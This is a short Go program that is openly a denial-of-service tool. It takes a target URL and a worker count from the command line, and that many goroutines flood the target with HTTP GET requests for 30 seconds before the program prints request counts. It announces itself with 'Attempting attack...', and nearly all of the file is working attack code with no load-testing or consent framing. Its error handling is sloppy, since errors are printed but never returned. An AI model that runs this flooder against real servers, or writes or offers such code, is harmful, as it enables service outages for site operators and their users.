package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"sync/atomic"
	"time"
)

type Ddos struct {
	url             string
	stop            *chan bool
	quantity        int
	amountRequests  int64
	successRequests int64
}

func CreateDDOS(URL string, quantity int) (*Ddos, error) {

	if quantity < 1 {
		fmt.Println("Worker quantity can't be less than 1")
	}

	u, err := url.Parse(URL)

	if err != nil || len(u.Host) == 0 {
		fmt.Println("Error while parsing url. Error: ", err)
	}

	s := make(chan bool)

	return &Ddos{url: URL, stop: &s, quantity: quantity}, nil
}

func (d *Ddos) Stop() {
	for i := 0; i < d.quantity; i++ {
		(*d.stop) <- true
	}
	close(*d.stop)
}

func (d *Ddos) Start() {

	for i := 0; i < d.quantity; i++ {

		go func() {
			for {
				select {
				case <-*d.stop:
					return
				default:
					resp, err := http.Get(d.url)
					atomic.AddInt64(&d.amountRequests, 1)

					if err == nil {
						atomic.AddInt64(&d.successRequests, 1)
						_, _ = io.Copy(io.Discard, resp.Body)
						closeErr := resp.Body.Close()
						if closeErr != nil {
							fmt.Println("Error closing the response body: ", closeErr)
						}
					}
				}
				runtime.Gosched()
			}
		}()
	}
}

func (d *Ddos) Results() (int64, int64) {
	return d.amountRequests, d.successRequests

}

const duration time.Duration = 30000000000 // 30 seconds

func main() {

	url := os.Args[1]
	quantity := os.Args[2]

	quantInty, _ := strconv.Atoi(quantity) // lmao quantINTY, get it?????

	fmt.Println("Attempting attack...")
	fmt.Println("Server: ", url)

	atk, err := CreateDDOS(url, quantInty)
	if err != nil {
		fmt.Println("Error while attempting attack: ", err)
	}

	atk.Start()
	time.Sleep(duration)
	atk.Stop()

	amountReqs, successReqs := atk.Results()

	fmt.Println("Number of requests: ", amountReqs, "\nSuccessful requests: ", successReqs)
}
